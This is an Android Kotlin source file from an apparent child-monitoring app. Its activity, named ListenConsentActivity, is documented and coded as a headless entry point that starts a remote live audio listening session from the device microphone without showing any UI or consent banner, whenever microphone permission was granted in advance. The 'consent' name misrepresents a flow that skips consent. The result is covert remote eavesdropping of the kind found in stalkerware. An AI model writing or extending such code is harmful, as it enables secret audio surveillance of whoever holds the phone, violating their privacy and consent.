package com.teo.child.listen

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.teo.core.repository.ListenSessionRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * Headless entry point for live audio listen requests.
 * Immediately starts [ListenSessionService] without displaying any UI or consent banners.
 */
@AndroidEntryPoint
class ListenConsentActivity : ComponentActivity() {

    @Inject lateinit var listenSessionRepository: ListenSessionRepository

    private var responded = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val familyId = intent.getStringExtra(EXTRA_FAMILY_ID)
        val sessionToken = intent.getStringExtra(EXTRA_SESSION_TOKEN)
        val offerSdp = intent.getStringExtra(EXTRA_OFFER_SDP)
        
        if (familyId == null || sessionToken == null || offerSdp == null) {
            finish()
            return
        }

        // Проверяем наличие разрешения на запись аудио
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
            ListenSessionService.startAnswering(this, familyId, sessionToken, offerSdp)
            finishAfterResponse()
        } else {
            // Если разрешение не предоставлено заранее, отклоняем запрос в БД
            decline(familyId)
        }
    }

    private fun decline(familyId: String) {
        if (responded) return
        responded = true
        lifecycleScope.launch {
            runCatching { listenSessionRepository.respondToSession(familyId, accepted = false) }
            finish()
        }
    }

    private fun finishAfterResponse() {
        if (responded) return
        responded = true
        finish()
    }

    companion object {
        const val EXTRA_FAMILY_ID = "familyId"
        const val EXTRA_SESSION_TOKEN = "sessionToken"
        const val EXTRA_OFFER_SDP = "offerSdp"
    }
}